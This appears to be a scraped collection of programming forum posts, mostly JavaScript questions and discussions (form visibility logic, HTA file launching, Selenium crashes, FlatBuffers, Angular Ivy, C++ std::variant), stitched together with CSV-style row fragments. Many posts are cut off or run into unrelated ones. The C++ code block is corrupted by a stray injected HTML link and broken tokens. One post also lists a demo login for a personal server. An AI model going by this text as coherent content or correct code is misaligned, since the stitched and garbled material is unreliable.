This timesheet is for an ambulance service.  The employees work 24 hour shifts.  On top of that, the pay schedule can be quite complex when dealing with PTO days, holidays, and over time calculations.

My specific issue is on the page where the user can enter a single time entry.  Some combinations are mutually exclusive; therefore, some options should not be visible when certain combinations of other options are visible.

I have radio buttons for the following:

    is24HrShift (Yes / No)
    isNightRun	(Yes / No)
    isPTO		(Yes / No)

I also have the following elements which need to be displayed depending on the results of the above.

    reason
    whichPTO
    timeBlock

When the page first loads the following should be visible and the initial values should be set as:

    is24HrShift		(Yes)
    isNightRun		(No)
    isPTO			(No)

The logic I have for this is as follows

    if (24HrShift)
    {
    	if( !isNightRun &amp;&amp; !isPTO)
    	{
    		show isNightRun
    		hide reason
    		show isPTO
    		hide whichPTO
    		hide timeBlock
    	}
    	if (isNightRun &amp;&amp; !isPTO)
    	{
    		show isNightRun
    		show reason
    		hide isPTO
    		hide whichPTO
    		show timeBlock
    	}
    	if (!isNightRun &amp;&amp; isPTO)
    	{
    		hide isNightRun
    		hide reason
    		show isPTO
    		show whichPTO
    		hide timeBlock
    	}
    }
    if (!24HrShift)
    {
    	if(!isNightRun &amp;&amp; !isPTO)
    	{
    		hide isNightRun
    		show reason
    		show isPTO
    		hide whichPTO
    		show timeBlock
    	}
    	if(!nightRun &amp;&amp; isPTO)
    	{
    		hide isNightRun
    		hide reason
    		show isPTO
    		show whichPTO
    		show timeBlock
    	}
    }

the following combinations can never be allowed:

    if (!24HrShift) then (isNightRun) can never be true
    if (is24HrShift &amp;&amp; isNightRun) then (isPTO) can never be true
    if (isPTO) then (isNightRun) can never be true. (regardless of the state of (is24HrShift))

http://storage.codebot.org

login: tester password: funkytown

The tool is a private cloud file server application. People will be able to get the source and configure it on their web server so that they can backup, share, or transfer files to themselves or among friends. The admin account can manage users, their rights, and storage limits.I just need to fix a few issues at first and create a setup guide before I post the source. 

What I've tried to do with this app is emulate a desktop application a bit through javascript.

Features:

You can drag and drop files or click to browse for uploads. Large uploads can be resumed if you close the page before the upload completes. Uploads can be paused and resumed.

The selection in file list can be navigated with up down and page up down arrow keys. Shift multi selects both with the mouse and keyboard. Control can toggle select on individual items.

Some files including video and audio can be viewed. It has code for http stream allowing seeking to positions in large video files without the need to download. Multi select can be used to create play lists. If you select a group of songs, then open the song and play it will continue playing the next song when the current song is done.

Enter selects items, function keys F2 renames inline, F3 search filters, F4 gives the option to turn sharing on/off (works with multiselect). File columns can be sorted.

The front end code was written using my own javascript library.

Already requested:

An ""invalid username or password"" dialog at login fail.

Is there any way to run local files in javascript in a HTA without using the full network path?

For example, when I'm setting the background of the HTA, I can just use:
    &lt;body background=""Data/background.jpg""&gt;

So if I run the HTA in a folder with a 'Data' folder in, the HTA will grab the background from there. I want to do the same with running files using the following code:

    &lt;script type=""text/javascript"" language=""javascript""&gt;
    function RunFile(path) {
    WshShell = new ActiveXObject(""WScript.Shell"");
    WshShell.Run(path, 1, false);
    }

    &lt;input type=""button"" value=""Test"" onclick=""RunFile('file://server/share/Data/background.jpg');""/&gt;

So in the above I open background.jpg using the UNC. If I run the HTA in ""share"", then I want to just be able to use:

    &lt;input type=""button"" value=""Test"" onclick=""RunFile('file:/Data/background.jpg');""/&gt;

But the above doesn't work. Any ideas? I've tried the following also using '.' before the path but no luck:

That's more or less the line I'm trying to follow: More about the _reasons_ behind some of the things in JavaScript. Why things work that way, rather than _How do I do...?_ or _What is...?_. The focus is both _Why_ and making the explanations as clear and understandable as possible.

So, what I wanted is to ask this:

Is there any way to close the connection to a text file in javascript once data has been read from it? The problem is that my hta keeps the text file connection live so new writes cannot be made to the text file by other programs. This is for the code below:

    test.value =iStream.ReadLine

I'd like something like:

    iStream=fso.CloseTextFile(test.txt, 1, false);

Or something that ends the activity. Any ideas?




Edit: I've created a workaround solution by creating a 'dummy.txt' that gets opened after the above. i.e

I need to build a custom, client-side JavaScript application that will extend the content experience platform, [Uberflip](https://learn.uberflip.com/developer-designer/adding-javascript-to-your-hub). Uberflip functions as a single page application and offers two key events that the script needs to listen/react to: `onLoad` and `onPageChange`. When fired, these events expose an `appInstance` object that offers useful properties like `timeStamp`, `queryString`, etc. to be used.

The idea is that, when a user visits an Uberflip page (firing the `onLoad` event) and navigates around the site (firing the `onPageChange` event), a well-designed JavaScript application will use this `appInstance` object to, in response to each event, conditionally gather, store, and POST query string data (via XMLHttpRequest) to two separate blind form endpoints.

[Here is my intial prototyping code](https://gist.github.com/StuartPBW/cb9249cc08a83c6e50b1606262a2a636) that uses a `Eloqua` constructor function with prototype methods that sends tag and timestamp property data on both `onLoad` `onPageChange` events.

The scenario is: 

I have a Python script (2.7) that loops through an number of URLs (e.g. think Amazon pages, scraping reviews).  Each page has the same HTML layout, just scraping different information.  I use Selenium with a headless browser as these pages have javascript that needs to execute to grab the information.

I run this script on my local machine (OSX 10.10).  Firefox is the latest v59.  Selenium is version at 3.11.0 and using geckodriver v0.20.  

This script locally has no issues, it can run through all the URLs and scrape the pages with no issue.

Now when I put the script on my server, the only difference is it is Ubuntu 16.04 (32 bit).  I use the appropriate geckodriver (still v0.20) but everything else is the same (Python 2.7, Selenium 3.11).  It appears to randomly crash the headless browser and then all of the `browserObjt.get('url...')` no longer work.  

The error messages say:

&gt; Message: failed to decode response from marionette

Any further selenium requests for pages return the error:

&gt; Message: tried to run command without establishing a connection

To show some code:

When I create the driver:

        options = Options()
        options.set_headless(headless=True)

        driver = webdriver.Firefox(
            firefox_options=options,
            executable_path=config.GECKODRIVER
        )

`driver` is passed to the script's function as a parameter `browserObj` which is then used to call specific pages and then once that loads it is passed to BeautifulSoup for parsing:

    browserObj.get(url)

    soup = BeautifulSoup(browserObj.page_source, 'lxml')

---

Adding stack trace which points to the same thing:

This script used to work with Chrome.  Because the server is a 32bit server, I can only use chromedriver v0.33, which only supports Chrome v60-62.  Currently Chrome is v65 and on DigitalOcean I don't seem to have an easy way to revert back to an old version - which is why I am stuck with Firefox.

---

When I try this same code on a different set of URLs for a different website, it no longer appears the `browser.get(...)` line is causing the error but rather the `browser.page_source`.  In the first set of URLs I found a work-around by using time.sleep(3) after the `.get()` call and that fixed it.  On this page that is no helping it.  I'd rather not throw it in a try-catch and if it fails to reboot selenium - I'd prefer to find a solution.

What is likely causing this, and what can I do to resolve the issue?

Two strings, `x` and `xu`, I want to turn `x` into `xu` but I've tried almost everything I've read and none worked out.

`x = '\u005e'`

`xu = u'\u005e'`

The first string comes from a scrapped javascript file and I know it's not unicode string. Even if I convert it to unicode with unicode() or `convert_x = u""{}"".format(x)` nothing seems to work. Also tried to use `x.decode('utf8')` but thus far all my attempts failed.

Since I don't feel too comfortable with js, I went ahead and created typings for kotlin-js (with some help from ts2kt).

* External class is almost always better than external interface

Python route - this returns what I initially put:

    @app.route(""/charting"", msonethods=[""GET"", ""POST""])

    def charting():

    rows = db.execute(""SELECT * FROM history WHERE id = :id"", id=session[""user_id""])

My boss is no stranger to PHP, has been a web developer for over a decade and a half, and has personally built a development platform on top of Joomla's K2 extension that makes it so easy to quickly pump out websites that I can do two a week - and I'm just a year out of college.

Unfortunately the core of that development process revolves around shortcuts, **and one of them is form security. It is handled entirely by about 15 lines of JavaScript. Zero server-side code. Zero.**

I went ahead a created my own sanitization and validation script on company time, but I was reprimanded for ""reinventing the wheel"" when we had a ""perfectly good, drag-and-drop solution"". My security is only live on maybe a fifth of our sites total.

The hours it would take to repair and secure each site properly could bankrupt us, and I can't even begin to tell you how much I love this job.

I need to be able to determine the character length of these lines AFTER any escaped characters have been converted to their appropriate character. In the example line above I'd like to calculate the length as 6.  However, taking .length on the string containing that line of course results in 10 because it's not parsing those characters since it's reading in the raw contents of this file.

When writing javascript if I did something like:
myVar = ""A\r\n\r\nB"";
console.log( myVar.length ); // Output 6.

I'd get the 6 length I'm wanting. Essentially my situation is like I had done the following:

myVar = ""A\\r\\n\\r\\nB"";
console.log( myVar.length ); // Output 10.

It's not how I'd normally write code, but as an experiment in super\-simple\-coding, it did sort of work.

1573,2018-05-21 11:59:01,0,2,"Closures, prototypes, JSON, the DOM, selectors, inheritance in CSS and in Javascript, and first class functions - that's what this course is about.

This is not a course on Javascript frameworks - its about solid, fundamental HTML, CSS and Javascript. You'll be surprised by how much more you can get done on your web pages once you learn these technologies the right way.

What do we mean by that?

Relatively few folks formally learn HTML, CSS or Javascript, because its quite easy to get stuff done in these technologies in a ""quick-and-dirty way"".

That ""quick-and-dirty"" way of learning and doing leads to problems over time, because Javascript and CSS are actually quite complex, so it is easy to do things the wrong way

This course will help, because it has 75 examples, 20 in HTML/CSS and 55 in Javascript. Each is self-contained, has its source code attached, and gets across a simple, specific use-case. Each example is simple, but not simplistic.

What's Included:

Basic HTML: Folks stopped counting HTML as a language worth formally learning sometime in the 90s, but this is only partially justified. It always helps to have strong basics.
CSS: Cascading Stylesheets are incredibly powerful, and incredibly hard to use - until you know how they really work. Once you understand inheritance and selection in CSS, it will all make a lot more sense.
Javascript is a full-fledged, powerful and complicated language. Its really important to learn Javascript formally, because it is just so different from most other languages you would have encountered. For instance - Javascript has objects and inheritance but no classes.
Closures in Javascript are a rather mind-bending concept - functions that ""remember"" how the world looked when they were created.
Prototypes are Javascript's way of doing inheritance, and its very different from the C++/Java way of doing it.
JSON is not conceptually difficult to use, but it is incredibly important, and you should understand why - because its the glue between backends written in Java or other traditional languages, and front-ends written in Javascript
The Document-Object-Model is what ties Javascript back to HTML and CSS. Together with JSON, the DOM ties it all together from server to skin.
Using discussion forums

Please use the discussion forums on this course to engage with other students and to help each other out. Unfortunately, much as we would like to, it is not possible for us at Loonycorn to respond to individual questions from students:-(

We're super small and self-funded with only 2 people developing technical video content. Our mission is to make high-quality courses available at super low prices.

The only way to keep our prices this low is to *NOT offer additional technical support over email or in-person*. The truth is, direct support is hugely expensive and just does not scale.

We understand that this is not ideal and that a lot of students might benefit from this additional support. Hiring resources for additional support would make our offering much more expensive, thus defeating our original purpose.

It is a hard trade-off.

Thank you for your patience and understanding!

Who is the target audience?

Yep! Folks who are absolutely new to web programming, and wish to learn HTML and CSS from scratch
Yep! Folks who are seeking to learn Javascript the right way - including folks who may done some Javascript programming, but are not quite confident using advanced features such as closures or dynamic prototyping
Yep! Java, C#, Python or C++ programmers who are looking to master Javascript
Nope! This class is not right for you if you are looking to learn Javascript frameworks such as JQuery, Angular or Node.js
Basic knowledge
Any modern browser and a simple text editor are all that will be needed for the code examples
Some prior programming experience will definitely help in the advanced Javascript portions - if you are entirely new to programming, the second half of the Javascript section will seem very challenging
What you will learn
Understand HTML - its structure, and the commonly used tags
Utilise CSS, including inheritance, selectors, the box model - the very topics that make CSS hard to use
Master the fundamentals of Javascript
Use closures, dynamic prototyping, JSON, and the Document-Object-Model with confidence

1580,2018-05-22 12:09:58,1,2,"Hi, I'm have an issue with Google's FlatBuffers Javascript module. I'm using React Native to build a mobile client for a project of mine. The idea is that my representation of user and post data (User and Post classes) have a method which uses FlatBuffers to serialise them into the binary format specified in SerialCodec.js (the compiled FlatBuffers schema) and return a UInt8Array which can be transmitted to the server over TCP. 

I've been following the FlatBuffers JS tutorial provided [here](https://google.github.io/flatbuffers/flatbuffers_guide_use_javascript.html) but I've encountered a stubborn error which I can't seem to debug. The relevant code listing is below:

    var flatbuffers = require('./flatbuffers').flatbuffers;
    var codec = require('./SerialCodec').codec;

    export default class User
    {
	  constructor(user_id, location) {
		  this.user_id = user_id;
		  this.user_type = 0;
		  this.location = location;
	  }

	  /* encodes the user data into the AM transmission format */
	  serialise_user() {

	  var builder = new flatbuffers.Builder(0); //error here

The error I get is:

    undefined is not an object (evaluating 'new flatbuffers.Builder')

    &lt;unknown&gt;
        User.js:15:31

This seems to indicate that the FlatBuffers module isn't returning a Builder object correctly, but it seems infinitely more likely that I've made an error somewhere. Can anybody point out where I've likely made an error?

Thanks in advance.",Problem with FlatBuffers: undefined is not an object

    document.querySelector('.my-super-long-element-name').innerText ... 

in and of itself is lengthy and with some indentation easily starts to stretch past 80 characters in line length. So my knee\-jerk reaction to solve this is simply to store the queried element inside a variable, like so

    var myElement = document.querySelector('.my-super-long-element-name'); 

and then just use something like below for DOM manipulation

In short: **I want to gauge interest to see if it's worth it to make a video series.** I'd have to essentially do twice the work in doing so, learning and teaching with recording and planning. Below are the details I've thought about. 

I would target the videos to be approximately ten minutes each, and to be as concise as possible.

Target audience:

* Knows some c#
* Is interested in Web Development
* Is interested in development using Linux
* Knows a little bit about html/javascript/css (Not super required, but helpful; I don't want this tutorial to be too basic)
* Entry-Level / Intermediate (i.e. people who want to have a new skill to be more marketable)

Tools that will be used/learned:

* Visual studio Code
* Ubuntu (An easy to use distribution of Linux)
* Mozilla Firefox
* Git/Github, Typescript, SCSS(Or LESS, I haven't decided)
* I will also cover requirements and feature requests / breaking it down into tasks
* Maybe even some collaboration? (Long term goal, I suppose)

Things I'm not sure about yet:

* Which database to use (Is there something free I can use? I have no idea.)
* How much to go into database design; even though it's very important, I don't want to overwhelm the audience with too much.
* (Maybe that can be a second series?)
* The focus I'm leaning towards is definitely going to be front-end, but there is still some back-end stuff that will be there, should I treat this as a full stack video series instead?

My teaching method would be to break things down into tasks, and then figure out how to solve problems. I would include mistakes I made along the way, because I think learning from mistakes is a valuable learning tool. I would first, solve the problem off screen, then write step-by-step how I came to that solution, so there's no time wasted, but something is still learned.

Through this web series, my project is going to be creating an open-source web forum/bulletin board system. This is so the viewers can see how we are working towards a larger goal. I realize that many of these already exist, but I was given this as an assignment, and I thought it was a great exercise in learning a framework.

Any thoughts/feedback about this idea are appreciated.","Would anyone be interested in a video series of me learning ASP.NET Core using linux, and teaching along the way?"

In BubbleSort.js the class is extending Sort class, but where is the super call to Sort's constructor? Without it how is BubbleSort able to call Sort class attributes through this.callbacks &amp; this.comparator?

Also, in BubbleSort.js is sort\(originalArray\) {...} a function or a constructor? If former, where is the constructor?

In Sort.js, we create a new Comparator object: *this.comparator = new Comparator\(this.callbacks.compareCallback\);*

And the constructor for Comparator:

*constructor\(compareFunction\) {     this.compare = compareFunction || Comparator.defaultCompareFunction;      }*

\( I'm assuming here if *compareFunction* is empty then* this.compar*e is assigned to* Comparator.defaultCompareFunctio*n?\)

Lastly, I'm really confused on how *this.callbacks.compareCallback* can be assigned to *this.compare* in the constructor?

This is probably the cause of my confusion, can you elaborate on this in the Sort.js?:

 /\*\*       \* @param {SorterCallbacks} originalCallbacks       \* @returns {SorterCallbacks}     \*/     

static initSortingCallbacks\(originalCallbacks\) {     

const callbacks = originalCallbacks || {};     

const stubCallback = \(\) =\&gt; {};          

callbacks.compareCallback = callbacks.compareCallback || undefined;     

callbacks.visitingCallback = callbacks.visitingCallback || stubCallback;          

return callbacks;

1599,2018-05-26 09:12:35,109,115,"I often need to hire out certain tasks for certain clients because I simply don't have time or interest in doing it, and I always end up getting screwed.

First of all I always hire on Upwork, and I always choose a fixed price, because that's how the client pay me. Second of all I always choose React/Redux/Firebase/Jest because that's what I know and like best.

I always require unit tests and split the work into weekly milestones, but I always end up getting screwed. The freelancer pretty much always assures me he knows how to do everything required, but in reality he does not. 

They try to ""learn on the job"" and inevitably fail the estimated deadline, then I wasted 1 week of my time waiting on them, plus they've also wasted their own time producing terrible/unusable code and I feel bad for paying them nothing.

The worst is when they finish a milestone 95% properly but ask for payment because they badly estimated their time and now I'm stuck paying them for incomplete work, that never gets completed because the freelancer simply doesn't have the skill the complete the last 5% (he lied in his interview). And most of the time finishing the last 5% on top on their bad code is just as long as rewriting completely.

Or even worst they start multiple milestones at the same time and spend 2-3 weeks working on something super hard, but they never actually complete any milestone with the required specifications (because they can't figure out how), and end up telling me that something isn't possible, when I know for a fact it is because I know this stack well. They keep giving me excuses like some relative died and end up producing thousands of lines of codes that are mostly unusable and would take less time to rewrite properly from scratch. So I'm stuck with useless code, and I feel bad because they've worked hundreds of hours on it, promising me they would fix it, but they just end up making it worse and worse.

It's a bad situation all around.

So how can I hire freelancers successfully for small-ish fixed price projects? Like I said most of my projects are usually SaaS type sites where the backend is handled by firebase/cloud functions and front end with react/redux. And tests handled with Jest. The budget really depends on the client, usually it will be a few thousands dollars and I simply interview whoever applies for the job on Upwork. 

Some projects might have had a price too low, but the fact that I ended up hiring bad applicants at these prices is a huge problem, I need to be able to filter applicants better and then tell my clients that their price is too low because no one good is applying, instead of hiring bad freelancers and wasting everyone's time.

I've thought about giving people challenges to test their skills, but that doesn't seem right for a job that should take 50-100 hours to complete.

As for interview questions, I have no idea what questions I should be asking that would screen freelancers that make bad design decisions when using react/redux/jest.

1602,2018-05-27 21:20:34,6,10,"A new compilation system, nicknamed “Angular Ivy” will allow compiled Angular apps to be tiny. We’re seeing [basic Hello World apps](https://ng-ivy-demo.firebaseapp.com/) as small as 3.3kb! This compares to React projects, where the minimal sizes are between 10\-30kb with just react\-dom.

Transitioning between Angular 1 and  2\+ was a pain. The major difference between the two versions was the addition of a  compilation process. No longer did you include a “angular\-1.6.9.min.js”  in a script tag, but rather you needed to import angular using a package manager, and run a compilation process which would give you one piece  of javascript \(called the bundle\) to include in your HTML page.

This choice to rethink the framework allowed the team behind  AngularJS to make progressive improvements over time that would not have  been possible with the original version.

Previously, even though you weren’t using many parts of Angular, the  code for that still had to be included in your bundle because the  compiler wasn’t advanced enough to figure what you were and were not  using.

Angular will soon be able to output much smaller filesizes because of  advancements in detecting dependencies on the framework\-feature level.

Angular Ivy as it’s called, is the newest rendering and view engine  the team is working on. This newest update will add advanced  tree\-shaking algorithms to the compiler, enabling it to figure exactly  what parts of Angular need to be included and which ones don’t.

This means that, for an example like like Hello World where very  little of Angular is needed \(e.g. no need to even include event  binding\), you can get tiny 3.3kb bundles.

A strong benefit of this is that developers will have a lot more  freedom to use Angular as they please. No longer will they be limited to  using it where a lot of interaction is required: even simple concepts  like landing pages could be developed with the angular toolkit without  taking a strong loading\-time hit.

The expected release is towards the end of this year, or the beginning of 2019.

It remains to be seen what the React ecosystem’s answer to this will  be. Although react can be pretty minimal already with precompiled pages,  it still requires a lot of finessing to get it right.

So with the new do notation popping around the corner. What do you guys think?
Personally, first impression isn't good at all, I hope I'm wrong. My issues are:

a) Expressions rock. Every function should strive to be an expression. Meaning that when writing a function, returning something that isn't undefined is king (well, not really, this is javascript after all). Does that mean that more then half of my functions will start with do (function () { do { }})? Basically, we are exchanging return's everywhere for do's.

b) Indentation. Considering the above, do's will be pervasive. Which means that practically all code will be indented an 2 or 4 spaces. Absolute waste of whitespace?

c) If you are familliar with haskell or purescript, you will know the do notation for monads. It's an excellent solution to the syntatic problem of monad chaining. Using do notation for the purpose of omitting the return keyword means we won't be able to use the keyword for monad chaining in the future anymore, which is a far better application of the do notation.
Not that I think we will have first class support for monads in javascript anytime soon, but this proposal doesn't help in that sense either.

Basically, my first opinion is that we are paying a heavy price for such a small benefit (not writing return out).

For the past couple of months I've been working on a simple programming environment, called Rescript, for writing JavaScript on iPad and iPhone.

The app runs on top of Node.js \(at the moment version 8.6.0\), and supports installing dependencies with npm.

It also provides a couple of custom modules that integrate with iOS, so it is possible to write scripts that interact with the device and the operating system \(you can for example share data with other apps, grab data from the device sensors or build simple custom graphical user interfaces\).

This first public version is still quite modest, but I'd like to start getting feedback early on.

If you have an iOS device and are curious,  you can join the free beta testing here [https://rescript.herokuapp.com](https://rescript.herokuapp.com/)

Now before we begin any further, let me say that I'm a university student (Studying Information Science) and much of my programming in the past has been done with Java (mainly for school) and Python (It was my first and it's what I sometimes toy with when I have ideas), though I've dabbled lightly in C# to help a friend and GOlang just for giggles.

I decided last night to finally kick myself back into action and try on my own terms to make a basic calculator using nothing but HTML, CSS, and Javascript.

What I was trying to do the whole time was put in a javascript file things like functions to get the sign in the buttons, and a class for the buttons and the calculator display.

I'm trying to figure out of I'm over-complicating things or something. Like, the simpler method is simpler and also works. I'm sure if I knew what I was doing, I'd probably have gotten what I was doing to work. But was I in the right to approach the problem like that from the start?

1642,2018-06-08 22:04:26,15,10,"
	
 
         
I played a bit with `std::variant` and came to the conclusion that you can create some sort of static polymorphism by composition instead of inheritance. Obviously I got some questions!  
  
Let's imagine I have two unrelated type with a common function `foo()`  
  
```cpp  
struct type_1 {  
    void foo();  
    // unrelated members and functions  
};  
struct type_2 {  
    void foo();  
    // unrelated members and functions  
};   
```  
  
  
If I want to create a variable that can be either of those types (for example in a vector), traditionally we create a base class and make both types inherit from it.  
  
  
```cpp  
struct base {  
    virtual void foo() = 0;  
};  
struct type_1: base {  
    void foo(int i) override;  
    // unrelated members and functions  
};  
struct type_2: base {  
    void foo(int i) override;  
    // unrelated members and functions  
};  
  
&lt;a name='sg_2' href=""javascript:void(0);"" onclick=""submit_bot('suggram', 'std::unique_ptr', 899, 21, 2, 436210624, 'std-58-58unique_ptr-60base-62');"" title='Click to get suggestions'class=&gt;std::unique_ptr&lt;base&gt; my_insta&lt;ce = // you must use a pointer if you want polymorphism (or a reference), but pointer are needed in a my_instance-&gt;foo(3); // call either type_1::foo(3) or type_2::foo(3) 
```  
  
But since c++17, there is another way of doing it using variant.  
  
```cpp  
struct type_1 {  
    void foo();  
    // unrelated members and functions  
};  
struct type_2 {  
    void foo();  
    // unrelated members and functions  
};  
using a&lt;gregate = std::variant&lt;type_1, type_2&gt;;  
  
template&lt;class... Args&gt;  
void foo(aggregate instance, Args... args) {  
    // see http://en.cppreference.com/w/cpp/utility/variant/visit for the implementation of overload  
    std::visit(overload {  
        [](auto instance_){ instance_.foo(args...);  
    }, instance);  
};  
  
aggregate my_instance = type_1{};  
foo(my_instance, 3);  
```  
  
The advantage of the inheritance are:  
- it's an open set. If a function is able to manipulate a `base`, it will handle any user-defined types that inherit from `base`. Thus it is great as a library interface.  
- The boilerplate is minimal (only 1 line per virtual function).  
The drawback are:  
- It is using a v-table witch mean that you pay 2 indirections when calling `base.foo(args...)`.  
- It is intrusive (`type_1` and `type_2` must inherit from base).  
- It requires dynamic allocation if y&lt;u want to have a  
  
The advantages of the variant version are:  
- When calling `foo(variant, args...)`, you will have only one indirection (instead of 2 for the v-table). 
- You don't need to modify `type_1` and `type_2`. Thus it is great to combine unrelated library-defined type.  
- You don't need any dynamic allocation (but the size of your object is slightly higher than the size of the biggest type between `type_1` and `type_2`.  
The disadvantage are:  
- There is a lot of boilerplate.  
- It is a closed set. You should only consider it in user code.  
  
At this point, I have two remarks:  
- I didn't found a way (except using a macro) to generate the boilerplate that calls `std::visit` for all functions shared by `type_1` and `types_2`.  
- I feel that it's probably over-engineering.  
  
Are any of my affirmations wrong? Do you have any remarks regarding my final comments? ",Question about static polymorphism (using std::variant) and dynamic polymorphism (using inheritance).

JSHint is one of the most popular static analysis tool in Continuous Integration (CI) pipeline for JavaScript code. Do you know it? How do you use JSHint to refactor your code in CI? 

Those are some of the questions we need your answer for.

I would really appreciate if you could find the time to fill the following  survey ([https://docs.google.com/forms/d/e/1FAIpQLSduHdEkRX4VoIlJXHmBEDXtMK6stPdZFIWrkF\_mdADp0dgQoA/viewform?usp=sf\_link](https://docs.google.com/forms/d/e/1FAIpQLSduHdEkRX4VoIlJXHmBEDXtMK6stPdZFIWrkF_mdADp0dgQoA/viewform?usp=sf_link)) to help me in my research.

It usually  takes 5 minutes (7 minutes at maximum).

If you have questions, please comment this post or send an email at the address you'll find in the survey.

These functions are in a closure and not accessible in the global window object.

I could download and unmifiy the script and replace it locally with my modified functionality, but I want to be able to interact with the functions in the chrome console and modify an extension to utilize these methods. Any pointers on how I can do this?

A few months back I was explaining REST to someone relatively new to web development and, although I got the point across, I wanted to take some time to put together a document that could better communicate the key concepts. 

In doing my research, I came across various descriptions and explanations of REST. I ultimately found it most useful to look at the source material and read through Dr. Roy Thomas Fielding's dissertation where he describes REST. 

I leaned heavily on this in putting together the below repo. If anybody would like to contribute to the project I'm happy to coordinate. At the moment there is an exercise where you can build a RESTful API using Node.js. Ideally I'd like to expand the exercise to include implementations in Python, Go, Java, etc.

To give you a bit more context about this topic:

Yesterday I was having a chat with a friend of mine, discussing the future of a project when I asked him: ""Have you got anything out of this project?""

His reply was: ""I got to learn typescript... I still think Flow is better because at the end of the day, I am still writing javascript and it does not need a compiler to work... I think TS is for those who do not know how to work with their code while javascript and Flow are for those who know how to work with their code...""

This resonated with me and bothered me but I couldn't immediately pinpoint why, until today. I feel the proponents of just javascript (and sometimes Flow) focus on the ideal: ""I know my code and my code works, why do I need to prove it to somebody else?""

I have a use case wherein we're developing an online game platform and would like to maintain the stack all the way. In our case we've pretty much decided on React, BUT we're using some additional libraries such as Phaser and so forth within React to bring a much more robust game development platform to a solid user interface framework.  These libs have so-so support for React Native and thus Cordova sounds very appealing in this regard as I believe it would help keep things more sane from a dev and support standpoint, especially down the road with updates.

From what I can gather Cordova exposes all of the native functionality one might need for social and gaming experience (perhaps as long as you're not doing very high performance VR and AR dev, then you might just be out of luck and have to go pure native at this point until things kick up).

I realize that a React + Cordova may be a less popular approach, but I do see some chatter about the combination on the Interwebz...

I'm trying to set up a facebook tracking pixel on my website. I need the pixel to be triggered on the submission of a contact form. My contact form does not redirect to a new page on submission, so i need to place the pixel to ""track event on in-line action"".

This is the snippet facebook have given me:

`&lt;button id=""submitButton""&gt;Generate lead&lt;/button&gt;`

`&lt;script type=""text/javascript""&gt;`

`$( '#$submitButton' ).click(function() {`

`insert_event_code_here;`

`...`

`&lt;/script&gt;`

And this is my current button Script:

`&lt;form role=""form"" method=""post"" id=""contactForm""&gt;`

`&lt;!-- my form fields --&gt;`

`&lt;div class=""col-md-12""&gt;`

`&lt;button type=""button"" id=""submit"" name=""submit"" class=""btn btn-primary pull-right control-submit""&gt;Send!&lt;/button&gt;`

How do i splice these two bits of code together to make a working facebook pixel triggered when the user clicks the send message button?

Also, where the facebook code says ""`insert_event_code_here;`"" what is this?

1690,2018-06-24 19:55:51,7,0,"It seems like Java is leaning towards incorporating more and more features and style of Javascript which are actually really great especially with Lambda expressions introduced in Java 8. It even provides means of implementing asynchronous programming especially with the whole Spring Webflux and reactor project that abstracts on top of it which is also great. Now Java 10 is even said to be introducing the Var keyword. This in particular is too hard to ignore and almost makes me feel like it is a desperate move to combat the market share the nodejs and npm movement has gained over the last few years. 

JavaScript on the other hand offers options such as TypesScript which although transpiles to Javascript, seems to be introduced with the intention of forcing developers to code in an OOP way of thinking (which java people are all too familar with) and enforcing rules before transpiling to javascript. They even introduced maps, sets, classes with constructors and Java style syntax for inheritance as an alternative to coding these things with with pre-ES6 style JavasScript prototype chain inheritance.

Since there are a wide range of languages that run on the JVM such as Kotlin which seems to be taking the best of both worlds. So how the Kotlin community will grow and disrupt this industry is going to be quite interesting. Either way it seems like JVM is the real winner here and not Java the language itself. But back to Java and Javascript, seems like both languages are borrowing from each other.

I have very good front end skills and I was going to work through two courses that taught technologies like nodejs, expressjs, PostgreSQL, and MongoDB and then a follow up course that got into advanced topics like SSH, optimizations, Redis, TypeScript, Docker, etc.

I have a little over a year of C# experience with WPF development due to internships and also some game development. I have aspirations to build my own software products as a side hustle, and I think ASP.NET Core would be great. It also aligns well with my area as most companies use .NET tech.

On top of this, I haven't really found courses like the two described above that give you a real round about delivery of Web App creations including continuous integration, deployment, etc.

So with all that being said, and for my entrepreneurial goals, is it better to learn [ASP.NET](https://ASP.NET) before [ASP.NET](https://ASP.NET) Core?

Then, I could look at learning [ASP.NET](https://ASP.NET) Core and it will be easier to pick up thanks to my newfound knowledge, and then I can chooses when to use one runtime environment for my backend or the other depending on the products end goal.

I've been building a music app - essentially a very lightweight DAW in the browser - using VueJS and ToneJS (a wrapper for the WebAudioAPI.) I run a Windows machine and primarily use the Chrome browser.

The app allows the user to create multiple 'tracks', each of which contains a selection of notes (chosen by the user) which are played in a loop simultaneously. My basic problem is, as tracks are added, audio performance degrades rapidly. The sound becomes distorted or flanged, and at around 4 tracks, significant crackling occurs, often accompanied by pauses in the timing of playback.

I'm asking about this here - in addition to the WebAudio and ToneJS forums - because it seems likely that solving my problem will require a good understanding of how Javascript performance works in general, possibly including details of browser implementation or operating system. 
I have been referred to this article: https://padenot.github.io/web-audio-perf/ , but much of it is frankly over my head at this point. 

Lacking a computer science background, I'm really not sure where to begin with this. What I'm hoping for is a discussion about *what the components of the knowledge base are* regarding performance, and *how to go about learning them.*  Certainly, links to specific resources, tutorials or courses are appreciated.

Now here's what I have to say.
***

##STOP HATING ON JAVASCRIPT##

People, it seems *everywhere* on Reddit there's a bunch of ~~dicks~~ \[insert polite expletive here\] answering every JavaScript question with ""Don't use JS"", or ""It doesn't work because it's JS"", and one ~~idiot~~ *fine gentleman* answered [my recent question about JavaScript's inner workings](https://www.reddit.com/r/javascript/comments/8vs7ge/will_i_have_useless_over_head_if_i_cast_an/ ""recent question regarding JS? Why wait, just click on it :)"") with ""You've already got useless overhead by using JavaScript.""\[*sic*\].

So, people, just *stop* complaining about JS. Even WASM can't replace JS, nor will it ever will; it was designed to *complement* JS, not *supplant* it.

Okay, now, to new developers, if you've heard people complaining about JS, it's probably because of a few features; look down below, and if you don't see a reason listed, please comment! (Also, correct me if I'm wrong down there, experienced devs!)

Bug|Feature
:--|:--
""Dynamic typing nightmare""|JS was designed to run on a browser *that ran on an OS* that runs on *we don't know how many VMs*, or that runs on *we don't know how old, memory-defiecient hardware*.
""Class &gt;&gt; Prototype""|Opinion leak. [Check this out](http://aaditmshah.github.io/why-prototypal-inheritance-matters/ ""Go on, check it out!"") \(Or see TL;DR below\).
""Can't manage memory in JS""|Screw right off, the browser knows much more about runtime resources than you *ever* will. I don't want your well-intentioned ""optimisation"" to break the page my browser is viewing.
""==/===""|If you *really* knew JS, you wouldn't be whining about this. As with every case, *never* blame the weapon, blame only the madman. *The tools do not the artist make.*
